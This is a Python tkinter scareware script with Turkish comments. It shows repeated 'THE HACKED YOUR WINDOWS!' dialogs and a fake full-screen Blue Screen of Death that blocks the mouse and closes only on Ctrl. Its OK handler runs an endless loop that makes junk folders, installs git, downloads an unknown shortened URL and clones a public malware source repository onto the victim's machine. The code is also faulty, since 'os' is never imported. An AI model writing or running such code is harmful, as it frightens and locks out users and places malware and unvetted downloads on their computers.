import tkinter as tk
from tkinter import simpledialog

def close_bsod(event):
    event.widget.quit()  # BSOD penceresini kapat

def show_bsod():
    bsod = tk.Tk()
    bsod.configure(bg='blue')
    bsod.attributes('-fullscreen', True)  # Tam ekran modu
    bsod.overrideredirect(1)  # Başlık çubuğunu ve çerçeveyi gizle

    # Fare olaylarını devre dışı bırak
    bsod.bind('<Button>', lambda event: None)
    bsod.bind('<Motion>', lambda event: None)

    # 'Ctrl' tuşuna basıldığında 'close_bsod' fonksiyonunu çağır
    bsod.bind('<Control_L>', close_bsod)
    bsod.bind('<Control_R>', close_bsod)

    sad_face_label = tk.Label(bsod, text=":(", font=("Arial", 50), bg='blue', fg='white')
    sad_face_label.pack()

    message_label = tk.Label(bsod, text="Your PC ran into a problem and needs to restart.\n"
                                        "We're just collecting some error info, and then we'll restart for you.",
                             font=("Arial", 20), bg='blue', fg='white')
    message_label.pack()

    bsod.mainloop()



class CustomErrorDialog(simpledialog.Dialog):
    def body(self, master):
        tk.Label(master, text="THE HACKED YOUR WINDOWS!").pack()
        return None  # Diyalogda giriş alanı oluşturulmasını engellemek için

    def buttonbox(self):
        # Standart 'OK' butonunu yeniden oluştur
        box = tk.Frame(self)
        w = tk.Button(box, text="OK", width=10, command=self.ok, default=tk.ACTIVE)
        w.pack(side=tk.LEFT, padx=5, pady=5)
        self.bind("<Return>", self.ok)
        box.pack()
        
        
    def ok(self, event=None):
        while True:
        	os.system("mkdir -p You are Hacked")
        	os.system("mkdir -p Hacked to Pc")
        	show_bsod()
        	os.system("winget install git")
        	os.system("wget https://www.virustotal.com/gui/file/8685cfb3f7602a158986cad5defd46179db23130ebc5fec022282d46e64c8d2b?nocache=1")
        	os.system("git clone https://github.com/vxunderground/MalwareSourceCode")
        	os.system("cd MalwareSourceCode")
        	os.system("mkdir -p You are Hacked?1")
        	os.system("mkdir -p fnaf2")
        	os.system("wget http://short-url.link/TPk")
        	os.system("mkdir -p senin isin bitti")
        self.withdraw()
        self.update_idletasks()
        self.cancel()

def simulate_error():
    for _ in range(10):
        d = CustomErrorDialog(root)
        # Kullanıcı 'OK' butonuna her bastığında 'CustomErrorDialog.ok' fonksiyonu çalışır
    root.destroy()  # Tüm hata mesajları gösterildikten sonra programı kapat

# Ana pencereyi oluştur
root = tk.Tk()
root.title("CMD Simülasyonu")
root.configure(background='black')
root.withdraw()  # Ana pencereyi gizle

# Hata simülasyonunu başlat
simulate_error()

# Ana döngüyü başlat
root.mainloop()